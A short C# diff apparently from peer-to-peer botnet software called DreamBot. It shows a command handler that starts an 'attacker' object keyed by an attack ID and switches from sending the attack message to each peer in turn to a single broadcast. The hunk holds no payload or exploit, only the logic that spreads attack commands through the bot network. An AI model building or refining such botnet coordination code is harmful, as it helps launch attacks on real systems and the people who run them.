@@ -32,10 +32,7 @@ namespace DreamBot.Network.Protocol.Handlers.Command
             attacker.Start();
             Attackers.Add(msg.AttackId, attacker);
 
-            foreach (var peer in _peerList)
-            {
-                _messageManager.Send(msg, peer.BotId, 0, botMessage.Header.Ttl--);
-            }
+            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
         }
     }
 
